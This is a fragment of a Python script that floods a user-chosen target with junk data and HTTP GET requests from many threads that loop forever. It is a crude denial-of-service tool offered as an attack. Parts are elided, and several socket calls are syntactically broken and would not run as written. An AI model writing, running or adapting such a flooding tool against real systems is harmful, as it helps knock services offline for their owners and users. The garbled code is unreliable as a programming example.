...
target = input("Enter target hare :> ")
port = int(input("Enter port hare :> "))
target2 = input("Enter taregt with https or http :> ")
threads = int(input("Enter threads hare :>  "))
File = '''
qazwsxedcrfvtgbyhnwertyujhgfdsdfghjnhbgfrtyhkwefgewjdfehfhgdf udhsfshadgfsgdfgsdfskjdsgdkfgsdkgfsdfs764773737282828919182938374839273egweryweyrwyerwyeruyweurwuegfsgdfgsjdfgwegfageefuygwaefuygwerugquyerguyguyerwguyewguywgerfwgwerwrgwrgdsrgeregegergergegujmik,ol.p;
'''
...
def attack2():
	while True:
		try:
			...
			s2.sendto("GET / " + target + "HTTP/1.1\r\n").encode() ('ascii') , ((target,port))
			s2.sendto("Host / " + target + "\r\n\r\n").encode() ('ascii') , ((target,port))
			s2.send(data)
			requests.get(target2)
			print("Packet sent ===>")
			s2.close()
...
def attack3():
    while True:
        try:
            ...
            s.connect((target,port))
            s.send(bytes(File,'utf-8'),((target,port)))
            s.send(f"GET / HTTP/1.1\r\nHost:{target}\r\n\r\n".encode(encoding='utf-8'))
            request = requests.get(target2)
            print("Packet sent ===>")
            s.sendto("GET / " + target + "HTTP/1.1\r\n").encode('ascii') , ((target,port))
            s.sendto("Host: " + target + "\r\n\r\n").encode('ascii') , ((target,port))
            s.send(data)
...
for i in range(threads):
    thread = threading.Thread(target=attack3)
    thread.start()
...
while True:
    thread = threading.Thread(target=attack4)
    thread.start()
